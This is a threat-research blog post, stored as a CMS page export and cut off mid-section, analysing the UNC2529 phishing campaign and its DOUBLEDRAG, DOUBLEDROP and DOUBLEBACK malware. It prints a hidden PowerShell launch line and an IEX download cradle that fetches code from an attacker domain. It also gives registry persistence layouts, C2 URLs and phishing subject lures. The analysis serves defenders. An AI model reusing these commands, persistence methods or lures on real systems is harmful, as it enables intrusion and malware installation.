{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Tue May 04 2021 14:05:32 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "The UNC2529 Triple Double: A Trifecta Phishing Campaign",
    "jcr:versionHistory": "d5fb5ff9-b44d-4bc5-bc9c-04b7ce66bca0",
    "author": "Nick Richard",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "f64a6996-796b-4a59-a204-ba179a989a5c"
    ],
    "jcr:created": "Wed May 05 2021 00:59:37 GMT+0000",
    "cq:lastModified": "Wed May 05 2021 00:59:10 GMT+0000",
    "jcr:baseVersion": "f64a6996-796b-4a59-a204-ba179a989a5c",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:nick-richard",
      "fireeye-blog-authors:dimiter-andonov",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:malware",
      "fireeye-blog-tags:phishing",
      "fireeye-blog-tags:unc"
    ],
    "jcr:uuid": "272f9d32-9f7a-4639-a963-236d4ac55552",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Tue May 04 2021 10:00:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EIn December 2020, Mandiant observed a widespread, global phishing campaign targeting numerous organizations across an array of industries. Mandiant tracks this threat actor as \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/12\/how-mandiant-tracks-uncategorized-threat-actors.html\u0022\u003EUNC2529\u003C\/a\u003E. Based on the considerable infrastructure employed, tailored phishing lures and the professionally coded sophistication of the malware, this threat actor appears experienced and well resourced. This blog post will discuss the phishing campaign, identification of three new malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a deep dive into their functionality, present an overview of the actor\u2019s modus operandi and our conclusions. A future blog post will focus on the backdoor communications and the differences between DOUBLEBACK samples to highlight the malware evolution.\u003C\/p\u003E\n\u003Ch4\u003EUNC2529 Phishing Overview\u003C\/h4\u003E\n\u003Cp\u003EMandiant observed the first wave of the phishing campaign occur on Dec. 2, 2020, and a second wave between Dec. 11 and Dec. 18, 2020.\u003C\/p\u003E\n\u003Cp\u003EDuring the initial flurry, Mandiant observed evidence that 28 organizations were sent phishing emails, though targeting was likely broader than directly observed. These emails were sent using 26 unique email addresses associated with the domain tigertigerbeads\u0026lt;.\u0026gt;com, and in only a small number of cases did we see the same address used across multiple recipient organizations. These phishing emails contained inline links to malicious URLs such as, hxxp:\/\/totallyhealth-wealth[.]com\/downld-id_mw\u0026lt;redacted\u0026gt;Gdczs, engineered to entice the victim to download a file. UNC2529 employed at least 24 different domains to support this first, of a three-stage process.\u003C\/p\u003E\n\u003Cp\u003EThe structure of URLs embedded in these phishing emails had the following patterns, where the string was an alphabetic variable of unknown function.\u003C\/p\u003E\n\u003Cp\u003Ehttp:\/\/\u0026lt;fqdn\u0026gt;\/downld-id_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/downld-id-\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/files-upload_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/files-upload-\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/get_file-id_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/get_file-id-\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/zip_download_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/zip_download-\u0026lt;string\u0026gt;\u003C\/p\u003E\n\u003Cp\u003EThe first stage payload downloaded from these URLs consisted of a Zip compressed file containing a corrupt decoy PDF document and a heavily obfuscated JavaScript downloader. Mandiant tracks the downloader as DOUBLEDRAG. Interestingly, the PDF documents were obtained from public websites, but corrupted by removing bytes to render them unreadable with a standard PDF viewer. It is speculated that the victim would then attempt to launch the JavaScript (.js) file, which can be executed natively with Windows Script Host by simply double clicking on the file. All but one of the file name patterns for the ZIP, PDF and JS files were document_\u0026lt;state\u0026gt;_client-id_\u0026lt;4 digit number\u0026gt;.extension, such as \u201cdocument_Ohio_client-id_8902.zip\u201d.\u003C\/p\u003E\n\u003Cp\u003EEach of the observed DOUBLEDRAG downloaders used in the first wave attempted to download a second-stage memory-only dropper, which Mandiant tracks as DOUBLEDROP, from either hxxp:\/\/p-leh[.]com\/update_java.dat or hxxp:\/\/clanvisits[.]com\/mini.dat. The downloaded file is a heavily obfuscated PowerShell script that will launch a backdoor into memory. Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK samples observed during the phishing campaign beaconed to hxxps:\/\/klikbets[.]net\/admin\/client.php and hxxps:\/\/lasartoria[.]net\/admin\/client.php.\u003C\/p\u003E\n\u003Cp\u003EPrior to the second wave, observed between Dec. 11\u0026nbsp;and Dec. 18, 2020, UNC2529 hijacked a legitimate domain owned by a U.S. heating and cooling services company, modified DNS entries and leveraged that infrastructure to phish at least 22 organizations, five of which were also targeted in the first wave. It is not currently known how the legitimate domain was compromised. The threat actor used 20 newly observed domains to host the second-stage payload.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EThe threat actor made slight modifications to the URL pattern during the second wave.\u003C\/p\u003E\n\u003Cp\u003Ehttp:\/\/\u0026lt;fqdn\u0026gt;\/\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/dowld_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/download_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/files_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/id_\u0026lt;string\u0026gt;\u003Cbr\u003E\nhttp:\/\/\u0026lt;fqdn\u0026gt;\/upld_\u0026lt;string\u0026gt;\u003C\/p\u003E\n\u003Cp\u003EOf note, the DOUBLEDRAG downloader observed in the first wave was replaced with a Microsoft Excel document containing an embedded legacy Excel 4.0 (XLM) macro in Excel 97-Excel 2003 Binary file format (BIFF8). When the file was opened and the macro executed successfully, it would attempt to download a second-stage payload from hxxps:\/\/towncentrehotels[.]com\/ps1.dat. The core functionality of the DOUBLEDRAG JavaScript file and the BIFF8 macro is to download a file from a hardcoded URL. This Excel file was also found within Zip files, as seen in the first wave, although only one of the observed Zip files included a corresponding corrupt decoy PDF document.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EAdditional DOUBLEBACK samples were extracted from DOUBLEDROP samples uploaded to a public malware repository, which revealed additional command and control servers (C2), hxxps:\/\/barrel1999[.]com\/admin4\/client.php, hxxps:\/\/widestaticsinfo[.]com\/admin4\/client.php, hxxps:\/\/secureinternet20[.]com\/admin5\/client.php, and hxxps:\/\/adsinfocoast[.]com\/admin5\/client.php. Three of these domains were registered after the observed second wave.\u003C\/p\u003E\n\u003Ch4\u003ETailored Targeting\u003C\/h4\u003E\n\u003Cp\u003EUNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads\u0026lt;.\u0026gt;com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company.\u003C\/p\u003E\n\u003Cp\u003EAnother example is a freight \/ transport company that received a phish with subject, \u201ccompton ca to flowery branch ga\u201d, while a firm that recruits and places long-haul truck drivers received a simple, \u201cdriver\u201d in the subject line.\u003C\/p\u003E\n\u003Cp\u003EA utility company received a phish with subject, \u201ceasement to bore to our stairwell area.\u201d\u003C\/p\u003E\n\u003Cp\u003EWhile not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1.\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESubject Lure\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EWave\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ere: \u0026lt;redacted\u0026gt; outdoors environment (1 out of 3)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eaccepted: follow up with butch \u0026amp; karen\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ere: appraisal for \u0026lt;redacted\u0026gt; - smysor rd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ere: \u0026lt;redacted\u0026gt; financing\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Sample financial industry subject lures\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ESeveral insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESubject Lure\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EWave\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efw: certificate of insurance\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Efw: insurance for plow\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eplease get this information\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Equestion \u0026amp; number request\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eclaim status\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eapplications for medicare supplement \u0026amp; part d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: Sample insurance industry subject lures\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EInterestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized.\u003C\/p\u003E\n\u003Cp\u003ESome patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 and 5 in Table 3). Most of the phishing emails with lures containing \u201cworker\u201d targeted U.S. organizations. As \u201cworker\u201d isn\u2019t a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESubject Lure\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EWave\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edear worker, your work # ujcb0utczl\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Egood day worker, your job number- 8ldbsq6ikd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ehello worker, your work number- u39hbutlsf\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1st\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Egood day candidate, your vacancy # xcmxydis4s\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022349\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edear worker, your work # ujcb0utczl\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002269\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2nd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 3: Sample pattern subject lures\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EIndustry and Regional Targeting\u003C\/h4\u003E\n\u003Cp\u003EUNC2529\u2019s phishing campaign was both global and impacted an array of industries (Industry and Regional Targeting graphics are greater than 100% due to rounding). While acknowledging some telemetry bias, in both waves the U.S. was the primary target, while targeting of EMEA and Asia and Australia were evenly dispersed in the first wave, as shown in Figure 1.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/unc2529-phishing\/fig1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: UNC2529 phishing campaign, first wave\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIn the second wave, EMEA\u2019s percentage increased the most, while the U.S. dropped slightly, and Asia and Australia remained at close to the same level, as illustrated in Figure 2.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/unc2529-phishing\/fig2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: UNC2529 phishing campaign, second wave\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAlthough Mandiant has no evidence about the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups.\u003C\/p\u003E\n\u003Ch4\u003ETechnical Analysis\u003C\/h4\u003E\n\u003Ch5\u003EOverview\u003C\/h5\u003E\n\u003Cp\u003EThe Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or alternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector starts with phishing emails that contain a link to download a malicious payload that contains an obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2 server and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented as a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor DOUBLEBACK. The dropper performs the initial setup that establishes the backdoor\u2019s persistence on the compromised system and proceeds by injecting the backdoor into its own process (PowerShell.exe) and then executing it. The backdoor, once it has the execution control, loads its plugins and then enters a communication loop, fetching commands from its C2 server and dispatching them. One interesting fact about the whole ecosystem is that only the downloader exists in the file system. The rest of the components are serialized in the registry database, which makes their detection somewhat harder, especially by file-based antivirus engines.\u003C\/p\u003E\n\u003Ch4\u003EEcosystem in Details\u003C\/h4\u003E\n\u003Ch5\u003EDOUBLEDRAG Downloader component\u003C\/h5\u003E\n\u003Cp\u003EThe downloader is implemented as a heavily obfuscated JavaScript code. Despite the relatively large amount of the code, it boils down to the following snippet of code (Figure 3), after de-obfuscation.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026quot;C:\\Windows\\System32\\cmd.exe\u0026quot; \/c oqaVepEgTmHfPyC \u0026amp; Po^wEr^sh^elL -nop -w hidden -ep bypass -enc \u0026lt;base64_encoded_ps_code\u0026gt;\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: De-obfuscated JavaScript downloader\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe \u003Cspan class=\u0022code\u0022\u003E\u0026lt;base64_encoded_ps_code\u0026gt;\u003C\/span\u003E downloads and executes a PowerShell script that implements the DOUBLEDROP dropper. Note, that the downloaded dropper does not touch the file system and it is executed directly from memory. A sanitized version of the code, observed in the first phishing wave, is shown in Figure 4.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EIEX (New-Object Net.Webclient).downloadstring(\u0026quot;hxxp:\/\/p-leh[.]com\/update_java.dat\u0026quot;)\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Downloading and executing of the DOUBLEDROP dropper\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EDOUBLEDROP Dropper component\u003C\/h4\u003E\n\u003Ch5\u003EOverview\u003C\/h5\u003E\n\u003Cp\u003EThe dropper component is implemented as an obfuscated in-memory dropper written in PowerShell. Two payloads are embedded in the script\u2014the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the encrypted payload along with the information related to its decryption and execution in the compromised system\u2019s registry database, effectively achieving a file-less malware execution.\u003C\/p\u003E\n\u003Ch5\u003ESetup\u003C\/h5\u003E\n\u003Cp\u003EThe dropper\u0027s main goal is to serialize the chosen payload along with the loading scripts into the compromised system\u0027s registry database and to ensure that the payload will be loaded following a reboot or a user login (see the Persistence Mechanism section). In order to do so, the dropper generates three pseudo-random GUIDs and creates the registry keys and values shown in Figure 5.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E* HK[CU|LM]\\Software\\Classes\\CLSID\\{\u0026lt;rnd_guid_0\u0026gt;}\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* key: LocalServer\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;bootstrap_ps_code\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* key: ProgID\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_1\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;last_4_chars_of_rnd_guid_0\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;encoded_loader\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* key: VersionIndependentProgID\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_1\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;first_4_chars_of_rnd_guid_0\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;encoded_rc4_key\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;last_4_chars_of_rnd_guid_0\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rc4_encrypted_payload\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E* HK[CU|LM]\\Software\\Classes\\{\u0026lt;rnd_guid_1\u0026gt;}\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_1\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* key: CLSID\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_0\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E* HK[CU|LM]\\Software\\Classes\\CLSID\\{\u0026lt;rnd_guid_2\u0026gt;}\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_1\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;* key: TreatAs\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * value: \u0026lt;default\u0026gt;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; * data: \u0026lt;rnd_guid_0\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Registry keys and values created by the dropper\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EOnce the registry keys and values are created, the dropper dynamically generates the bootstrap and the launcher PowerShell scripts and saves them under the \u003Cspan class=\u0022code\u0022\u003E{\u0026lt;rnd_guid_0\u0026gt;}\u003C\/span\u003E registry key as shown in Figure 5. Additionally, at this point the dropper generates a random RC4 key and encodes it inside a larger buffer which is then saved under the VersionIndependentProgID key. The actual RC4 key within the buffer is given by the following calculations, shown in Figure 6 (note that the key is reversed!).\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;relative_offset\u0026gt; = buffer[32]\u003Cbr\u003E\n buffer[32 + \u0026lt;relative_offset\u0026gt; + 1] = \u0026lt;reversed_rc4_key\u0026gt;\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Encoding of the RC4 key\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFinally, the dropper encrypts the payload using the generated RC4 key and saves it in the respective value under the VersionIndependentProgId registry key (see Figure 5).\u003C\/p\u003E\n\u003Cp\u003EAt this point all the necessary steps that ensure the payload\u0027s persistence on the system are complete and the dropper proceeds by directly executing the launcher script, so the backdoor receives the execution control immediately. The persistence mechanism, the bootstrap, and the 